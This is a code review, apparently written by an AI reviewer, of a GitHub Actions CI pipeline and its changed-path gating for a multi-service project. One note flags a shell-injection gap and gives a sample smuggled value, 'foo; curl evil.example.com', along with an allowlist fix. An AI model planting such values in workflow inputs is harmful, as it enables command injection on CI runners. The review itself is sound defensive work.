# Review: BP5-CICD-001 — GitHub Actions stage-0 CI and changed-path gating

**Reviewer:** Claude  
**Date:** 2026-04-15  
**Verdict:** APPROVED — with two non-blocking follow-up notes

---

## What was reviewed

- `.github/workflows/stage-0-ci.yml` — GitHub Actions pipeline
- `.github/pantheon-stage0-matrix.json` — service matrix (21 targets)
- `scripts/ci_stage0.py` — changed-path detector / validator / runner
- `scripts/test_ci_stage0.py` — unit test suite (6 tests)
- `Pantheon_GCP_GitHub_Docker_正式部署與環境設計_v2.md` — Wave 1 alignment

---

## Validation results

```
python3 scripts/ci_stage0.py validate
→ schema_version: 1, global_path_rules: 7, target_count: 21
→ all 14 Wave 1 doc IDs present in matrix

python3 -m unittest scripts/test_ci_stage0.py
→ Ran 6 tests in 0.006s — OK
```

---

## What passes

1. **Matrix coverage** — all 14 Wave 1 service IDs (router, persona, bff, feedback, runtime-control, governance-api, telemetry-ingest, lineage-read, signal-store, web, cron, mlflow-server, lean, runtime-manager) are present in the stage-0 matrix.

2. **Doc alignment gate** — `load_config()` enforces that the deployment doc references `.github/pantheon-stage0-matrix.json` and that every `### 4.3` Wave 1 ID maps to a matrix target. Breaking this alignment fails the `validate` step in CI before any jobs run.

3. **Changed-path gating** — `compute_changed_targets` correctly narrows to service-specific targets for service-only changes, and falls back to all targets when a global path (workflow, matrix, compose, doc) changes.

4. **Zero-SHA fallback** — `diff_changed_files` detects an all-zeros `before` SHA (initial push) and triggers a full sweep. Correct.

5. **Concurrency** — `cancel-in-progress: true` prevents queue buildup on rapid pushes to main.

6. **`fail-fast: false`** on matrix jobs — shows all failures, not just the first. Correct for CI visibility.

7. **Dependency review gate** — scoped to `pull_request` events only; `fail-on-severity: high` is an appropriate default.

8. **Permissions** — `contents: read` at workflow level. Appropriately minimal for a CI-only pipeline.

9. **GitHub output format** — `write_output` uses random delimiters (`EOF_<hex>`) to safely escape multiline values. No output-injection risk.

---

## Non-blocking follow-up notes (not a blocker for approval)

### N1 — `changed-build-dry-run` missing `Set up Python` step

The `changed-build-dry-run` job calls `python3 scripts/ci_stage0.py` without an explicit `actions/setup-python@v5` step. The other three jobs all pin `python-version: "3.12"`. `ubuntu-latest` ships with Python 3 (currently 3.10–3.12 depending on runner image), and `from __future__ import annotations` keeps the type hints compatible. This works in practice but is inconsistent. A future runner image bump could silently change the Python version in that job while all others stay at 3.12.

**Suggested fix:** add `Set up Python / python-version: "3.12"` to `changed-build-dry-run`, same as the other jobs.

### N2 — `target.id` allows arbitrary characters, creating a shell-injection surface in the workflow

`validate_target` calls `ensure_string("target.id", ...)` which only checks that the ID is a non-empty string. The workflow then inlines the ID directly:

```yaml
run: python3 scripts/ci_stage0.py run-target --target-id "${{ matrix.target_id }}" ...
```

A PR that modifies the matrix to include a target ID with shell metacharacters (e.g., `foo; curl evil.example.com`) would pass `ensure_string` and be injected into the runner shell. The blast radius is bounded by `permissions: contents: read` and the fact that changing the matrix requires a PR, but this is still a hardening gap.

**Suggested fix:** add a character allowlist check in `validate_target`:

```python
import re
_SAFE_ID = re.compile(r'^[a-z0-9][a-z0-9-]*$')
if not _SAFE_ID.match(target_id):
    raise Stage0ConfigError(f"target.id must match [a-z0-9][a-z0-9-]*: {target_id!r}")
```

All 21 current IDs already match this pattern. Could be addressed in BP5-CICD-002 or a quick follow-up commit.

---

## Summary

The stage-0 CI pipeline is production-ready for its intended scope. The matrix-doc alignment gate is the strongest feature — it enforces that the Wave 1 inventory and the CI matrix stay in sync automatically. Changed-path gating, global-path full-sweep, and zero-SHA fallback are all correctly implemented and tested. The two notes above are hardening improvements and do not block delivery.
